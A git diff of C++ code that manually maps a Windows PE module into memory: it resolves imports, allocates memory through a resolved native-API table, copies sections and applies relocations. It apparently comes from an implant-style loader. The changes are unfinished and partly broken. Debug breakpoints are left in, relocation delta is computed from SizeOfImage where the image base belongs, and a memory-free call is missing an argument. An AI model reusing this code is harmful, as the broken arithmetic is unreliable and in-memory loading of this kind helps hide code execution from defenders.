@@ -375,7 +375,6 @@ namespace Modules {
 
     BOOL ResolveImports(const EXECUTABLE *module) {
 
-		__debugbreak();
         PIMAGE_IMPORT_BY_NAME import_name      = nullptr;
         PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc = nullptr;
 
@@ -386,11 +385,13 @@ namespace Modules {
         UINT8 local_buffer[MAX_PATH] = { };
 
         if (data_dire->Size) {
-            PIMAGE_IMPORT_DESCRIPTOR import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
-            PIMAGE_IMPORT_DESCRIPTOR scan = import_desc;
 
             DWORD count = 0;
-            for (; scan->Name; scan++) {
+            auto import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
+
+			__debugbreak();
+			// access violation trying to access import_desc. the image might be broken.
+            for (auto scan = import_desc; scan->Name; scan++) {
                 count++;
             }
 
@@ -544,48 +545,48 @@ namespace Modules {
     BOOL MapModule(EXECUTABLE *module) {
         HEXANE;
 
+		bool success = false;
 		if (!module->nt_head) {
-			return false;
+			goto defer;
 		}
-        const auto pre_base = module->nt_head->OptionalHeader.ImageBase;
+
+        module->base = module->nt_head->OptionalHeader.ImageBase;
         auto region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
 
-        module->base = pre_base;
-
         if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
-            module->base != pre_base) {
+            module->base != module->nt_head->OptionalHeader.ImageBase) {
 
             module->base = 0;
-            region_size = module->nt_head->OptionalHeader.SizeOfImage;
+            region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
 
             if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
-                return false;
+                goto defer;
             }
         }
 
 		if (!module->base) {
-			return false;
+			goto defer;
 		}
-
-		module->section = IMAGE_FIRST_SECTION(module->nt_head); 
 
 		// copy headers to allocated buffer
         for (auto head_index = 0; head_index < module->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
-            B_PTR(module->base)[head_index] = module->buffer[head_index];
+            B_PTR(module->base)[head_index] = B_PTR(module->buffer)[head_index];
         }
 
-		// copy section @ address to allocated buffer
+		module->section = IMAGE_FIRST_SECTION(module->nt_head); 
+
+		// copy section address to allocated buffer
         for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
             for (auto sec_index = 0; sec_index < module->section->SizeOfRawData; sec_index++) {
-                (B_PTR(module->base + module->section->VirtualAddress))[sec_index] = (module->buffer + module->section->PointerToRawData)[sec_index];
+                (B_PTR(module->base + module->section->VirtualAddress))[sec_index] = (B_PTR(module->buffer + module->section->PointerToRawData))[sec_index];
             }
         }
 
-        UINT_PTR base_rva = module->base - pre_base;
+        UINT_PTR base_rva = module->base - module->nt_head->OptionalHeader.SizeOfImage;
         PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
         // if non-zero rva and relocdir exists...
-        if ((module->base - pre_base) && relocdir) {
+        if ((module->base - module->nt_head->OptionalHeader.ImageBase) && relocdir) {
             PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);
 
             do {
@@ -606,7 +607,16 @@ namespace Modules {
         }
 
         module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
-        return true;
+		success = true;
+
+	defer:
+		if (!success) {
+			if (module->base) {
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**)&module->base, MEM_RELEASE);
+			}
+		}
+
+        return success;
     }
 
     BOOL AddModuleEntry(PLDR_DATA_TABLE_ENTRY entry, const void *base) {
